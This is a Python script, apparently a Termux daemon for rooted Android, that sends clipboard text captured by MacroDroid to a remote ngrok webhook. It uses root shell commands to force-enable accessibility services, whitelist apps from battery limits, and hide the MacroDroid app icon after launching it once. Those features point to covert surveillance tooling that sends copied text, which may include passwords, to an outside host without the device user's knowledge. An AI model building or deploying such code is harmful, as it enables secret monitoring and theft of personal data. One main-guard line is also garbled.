import sys
import os
import time
import json
import subprocess
import requests

# 1. Configura caminhos absolutos
CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
BASE_DIR = os.path.dirname(CURRENT_DIR)
if BASE_DIR not in sys.path:
    sys.path.insert(0, BASE_DIR)

FUNCTIONS_FILE = os.path.join(CURRENT_DIR, "functions.json")
WEBHOOK_CACHE = os.path.join(CURRENT_DIR, ".webhook_cache")
DATA_DIR = os.path.join(BASE_DIR, "Data")
INIT_MARKER_FILE = os.path.join(DATA_DIR, "macrodroid_initialized.json")

def check_local_status():
    """Lê o JSON para saber se o sistema de cópia está ativado no painel."""
    if os.path.exists(FUNCTIONS_FILE):
        try:
            with open(FUNCTIONS_FILE, "r") as f:
                config = json.load(f)
                return config.get("auto_copy", config.get("autocopy", False))
        except: pass
    return False

# =========================================================
# MODO 1: GATILHO MACRODROID (Executado via root)
# Recebe: python auto_copy.py [ID_UNICO] [TEXTO_COPIADO]
# =========================================================
if len(sys.argv) >= 3:
    msg_id = sys.argv[1]
    texto_recebido = sys.argv[2]

    print(f"🤖 [MACRODROID TRIGGER] ID: {msg_id} | Texto: {texto_recebido}", flush=True)

    try:
        debug_log_path = os.path.join(CURRENT_DIR, "debug_macrodroid.log")
        with open(debug_log_path, "a", encoding="utf-8") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] ID: {msg_id} | Recebido: {texto_recebido}\n")
    except Exception as e:
        print(f"Erro ao salvar log de debug: {e}")

    if not check_local_status():
        print("🔴 [GATILHO] Painel desligado. Ignorando envio para nuvem.", flush=True)
        sys.exit(0)

    try:
        from security_system.core import gerar_assinatura_hmac, obter_dna_dispositivo
    except ImportError:
        print("❌ [FALHA] Falha de segurança ao carregar o Cofre.")
        sys.exit(5)

    try:
        with open(WEBHOOK_CACHE, "r") as f:
            URL_WEBHOOK = f.read().strip()
    except:
        URL_WEBHOOK = "https://pandanaceous-meghann-nonincarnate.ngrok-free.dev/webhook"

    def enviar_para_nuvem(unique_id, texto_copiado):
        dna_seguro = obter_dna_dispositivo()
        ts_agora = int(time.time())
        assinatura = gerar_assinatura_hmac(dna_seguro, ts_agora)

        payload = {
            "event": "clipboard_sync",
            "message_id": unique_id,
            "device_dna": dna_seguro,
            "timestamp": ts_agora,
            "clipboard_text": texto_copiado
        }

        envelope_seguro = {
            "signature": assinatura,
            "payload": payload
        }

        try:
            print(f"📤 Enviando ID {unique_id} para o Webhook: {URL_WEBHOOK}...", flush=True)
            resposta = requests.post(URL_WEBHOOK, json=envelope_seguro, headers={"Content-Type": "application/json"}, timeout=10)
            print(f"✅ Webhook respondeu: {resposta.status_code}")
        except Exception as e:
            print(f"❌ Erro ao enviar webhook: {e}")

    enviar_para_nuvem(msg_id, texto_recebido)
    sys.exit(0)

# =========================================================
# MODO 2: DAEMON (Botão Ligado - Chamado pelo task_orchestrator)
# =========================================================
if len(sys.argv) < 5:
    print(f"❌ [FATAL ERROR] Faltam argumentos para o Daemon! Recebido: {sys.argv}", flush=True)
    sys.exit(1)

DEVICE_ID = sys.argv[1]
GUILD_ID = sys.argv[2]
OWNER_ID = sys.argv[3]
URL_WEBHOOK = sys.argv[4]

try:
    with open(WEBHOOK_CACHE, "w") as f:
        f.write(URL_WEBHOOK)
except: pass

def verificar_e_iniciar_macrodroid():
    """Verifica na pasta Data se o MacroDroid já foi aberto/configurado alguma vez.
       Se nunca rodou, desoculta, abre por 5 segundos para inicializar os serviços e oculta de novo."""
    os.makedirs(DATA_DIR, exist_ok=True)
    
    if os.path.exists(INIT_MARKER_FILE):
        print("ℹ️ [SETUP] MacroDroid já foi inicializado anteriormente. Pulando abertura de tela.", flush=True)
        return

    print("🚀 [SETUP] Primeira execução detectada! Configurando e inicializando MacroDroid...", flush=True)
    
    # 1. Desoculta temporariamente
    subprocess.run('su -c "pm unhide com.arlosoft.macrodroid"', shell=True, capture_output=True)
    time.sleep(1)

    # 2. Abre o app via monkey para registrar os serviços no sistema
    subprocess.run('su -c "monkey -p com.arlosoft.macrodroid 1"', shell=True, capture_output=True)
    print("⏳ Aguardando MacroDroid carregar os serviços em segundo plano (5s)...", flush=True)
    time.sleep(5)

    # 3. Oculta de novo para sumir com o ícone
    subprocess.run('su -c "pm hide com.arlosoft.macrodroid"', shell=True, capture_output=True)

    # 4. Cria o arquivo de marcação em Data para nunca mais repetir
    try:
        with open(INIT_MARKER_FILE, "w") as f:
            json.dump({"initialized": True, "timestamp": time.time()}, f)
        print("✅ [SETUP] MacroDroid configurado e ocultado com sucesso. Marcador salvo em Data/.", flush=True)
    except Exception as e:
        print(f"⚠️ Aviso ao salvar marcador de inicialização: {e}", flush=True)

def forcar_acessibilidade():
    print("🔧 [SETUP] Injetando permissões de Acessibilidade no sistema...", flush=True)
    servicos = "com.arlosoft.macrodroid/com.arlosoft.macrodroid.triggers.services.MacroDroidAccessibilityServiceJellyBean:com.arlosoft.macrodroid/com.arlosoft.macrodroid.UIInteractionAccessibilityService:com.arlosoft.macrodroid/com.arlosoft.macrodroid.MacroDroidAccessibilityService"
    subprocess.run('su -c "settings put secure accessibility_enabled 0 > /dev/null 2>&1"', shell=True)
    subprocess.run(f'su -c "settings put secure enabled_accessibility_services {servicos} > /dev/null 2>&1"', shell=True)
    subprocess.run('su -c "settings put secure accessibility_enabled 1 > /dev/null 2>&1"', shell=True)
    
    # Garante whitelist de bateria
    subprocess.run('su -c "dumpsys deviceidle whitelist +com.arlosoft.macrodroid > /dev/null 2>&1"', shell=True)
    subprocess.run('su -c "dumpsys deviceidle whitelist +com.termux > /dev/null 2>&1"', shell=True)

def main():
    print("📡 Hapiephone Copy System Online (Modo Híbrido Seguro)...", flush=True)
    subprocess.run("termux-wake-lock", shell=True, check=False)

    forcar_acessibilidade()
    verificar_e_iniciar_macrodroid()
    
    estado_ativo = False

    while True:
        deve_rodar = check_local_status()

        if deve_rodar and not estado_ativo:
            print("🟢 [GATILHO] Sistema de Cópia LIGADO. Aguardando gatilho invisível do MacroDroid...", flush=True)
            estado_ativo = True

        elif not deve_rodar and estado_ativo:
            print("🔴 [GATILHO] Sistema de Cópia DESLIGADO.", flush=True)
            estado_ativo = False

        time.sleep(5)

if __name__ ==".main__": # Evita execução errada se importado
    pass

if __name__ == "__main__":
    main()
